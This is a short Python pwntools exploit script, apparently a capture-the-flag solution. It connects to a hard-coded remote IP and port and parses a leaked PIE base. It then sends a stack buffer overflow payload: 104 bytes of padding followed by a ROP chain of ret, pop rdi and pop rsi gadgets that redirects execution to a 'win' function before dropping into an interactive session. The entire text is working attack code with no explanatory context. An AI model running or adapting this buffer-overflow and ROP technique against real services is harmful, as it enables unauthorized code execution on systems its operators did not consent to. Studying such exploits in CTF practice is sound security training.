from pwn import *

c = connect('103.77.175.40', 6031)


c.recvuntil(b"Opps! ")

pie_base = int(c.recvline().strip(), 16)

a1 = 0xDEADBEEFDEADBEEF
a2 = 0xDEADBEEFDEADBEEF
pop_rdi = pie_base + 0x11f8 #0x00000000000011f8 : pop rdi ; ret
pop_rsi = pie_base + 0x1201 #0x0000000000001201 : pop rsi ; ret
gadget_ret = pie_base + 0x101a #0x000000000000101a : ret


payload = b'A'*104
payload += p64(gadget_ret)
payload += p64(pop_rdi) + p64(a1)
payload += p64(pop_rsi) + p64(a2)
payload += p64(pie_base+0x1206) #jump to win


c.sendlineafter(b'number: ' , payload)

c.interactive()
